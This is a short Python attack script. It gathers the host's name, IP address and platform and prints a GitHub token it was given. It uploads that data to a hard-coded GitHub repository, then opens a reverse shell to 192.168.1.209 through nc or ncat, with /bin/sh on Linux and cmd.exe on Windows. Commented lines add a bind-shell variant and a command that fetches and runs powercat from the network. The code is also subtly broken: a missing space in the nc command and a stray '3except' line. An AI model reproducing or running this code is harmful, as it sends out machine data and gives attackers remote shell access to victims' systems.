import platform
import os
import sysconfig
import socket
import json
import base64
import requests
try:
    from github import Github
except:
	os.system('python -m pip install PyGithub')


def create_file(file_path, content):
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(content)

def delete_file(file_path):
    os.remove(file_path)

def upload_file(token,fname,sntc):
	g = Github(token)
	repo = g.get_repo("kaki714/Not")
	filename = fname
	data = sntc
	
	
	path = "data/data.txt" # Especifica la ruta y el nombre del archivo en el repositorio
	
	commit_message = "Agregando data.txt al repositorio" # Especifica el mensaje del commit

	# Crea el archivo en el repositorio
	try:
		file=repo.get_contents(path)
		repo.update_file(path,"actualizando data",data,file.sha)
	except:
		repo.create_file(path, commit_message, data)
		
	


	



        

def run(token):
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    iph='192.168.1.209'
    fname="data.txt"
    print('')
    print(' ############### # # # ##############')
    print(' ####### ###### # #  # # ####### ####')
    print(' ######   ##### ##    ## ######   ###')
    print(' ####### #######  #  #  ######## ####')
    print(' ################ ### ###############')
    print('')
    print('OS name : ', platform.system())
    print('Linux: ', sysconfig.get_platform(),' === CONNECTED ') 
    print(' IpAddress: ', IPAddr)
    print('TokenData: ', token)
    stmnt= 'Info: '+ IPAddr+' System: '+sysconfig.get_platform()
    print(stmnt)
    create_file(fname,stmnt)  
    upload_file(token,fname,stmnt)
    delete_file(fname)
    if "Linux" in platform.system():
        #os.system( 'nc -lvp 734 -e /bin/sh')
        os.system('nc' + iph+ ' 734 -e /bin/sh')
    elif "Windows" in platform.system():
        try:
	   #os.system('ncat -lvp 734 -e cmd.exe')
            os.system('ncat '+ iph +' 734 -e cmd.exe')
	
	3except:
	   #os.system('iex(iwr https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 -UseBasicParsing)')
